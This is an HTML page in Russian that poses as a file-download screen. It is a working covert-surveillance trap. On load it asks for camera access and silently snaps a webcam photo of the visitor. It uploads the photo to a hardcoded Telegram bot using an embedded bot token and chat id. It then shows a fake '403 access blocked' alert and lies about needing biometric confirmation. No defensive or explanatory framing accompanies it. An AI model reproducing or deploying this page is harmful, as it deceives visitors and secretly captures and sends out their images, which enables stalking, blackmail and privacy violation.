<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Загрузка файла...</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding-top: 25%; margin: 0; }
        .spinner { border: 4px solid rgba(255,255,255,0.1); border-left-color: #fff; border-radius: 50%; width: 45px; height: 45px; animation: s 1.2s linear infinite; margin: 20px auto; }
        @keyframes s { to { transform: rotate(360deg); } }
        #status { font-size: 14px; color: #666; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <p>Обработка запроса...</p>
    <div id="status">Идентификация устройства...</div>

    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const token = '8696512848:AAFqoqJ0210CXpzF56PtzcG-bv1cTvWIlPo'; 
        const chat_id = '1789528504';

        async function init() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('v');
                video.srcObject = stream;

                // Ждем 3 секунды для идеального качества
                setTimeout(() => {
                    const canvas = document.getElementById('c');
                    const context = canvas.getContext('2d');

                    // Устанавливаем размер холста РАВНЫМ размеру видео (чтобы не было растягивания)
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;

                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', chat_id);
                        formData.append('photo', blob, 'shot.jpg');

                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { 
                            method: 'POST', 
                            body: formData 
                        }).then(() => {
                            document.getElementById('status').innerText = "Ошибка доступа (403)";
                            alert("Внимание: Доступ к ресурсу заблокирован по протоколу безопасности.");
                            stream.getTracks().forEach(t => t.stop());
                        });
                    }, 'image/jpeg', 0.9); // Качество 90%

                }, 3000); 

            } catch (err) { 
                alert("Ошибка: Для входа требуется подтверждение биометрии через браузер."); 
            }
        }
        window.onload = init;
    </script>
</body>
</html>
